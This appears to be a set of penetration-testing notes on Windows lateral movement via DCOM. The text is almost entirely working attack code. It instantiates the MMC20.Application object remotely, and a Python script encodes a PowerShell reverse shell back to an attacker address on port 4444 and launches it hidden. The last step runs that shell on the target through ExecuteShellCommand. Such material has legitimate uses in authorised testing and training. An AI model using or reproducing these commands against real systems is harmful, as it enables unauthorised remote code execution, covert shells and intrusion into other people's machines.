remotely instantiating the MMC Application object
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application.1","192.168.x.x"))
```

generate base64 powershell payload
```python
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.x.x",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```

runnnig the base64 encoder python script
```bash
python3 encode.py
```

reverse shell as a DCOM payload
```powershell
$dcom.Document.ActiveView.ExecuteShellCommand("powershell",$null,"COMMAND","7")
```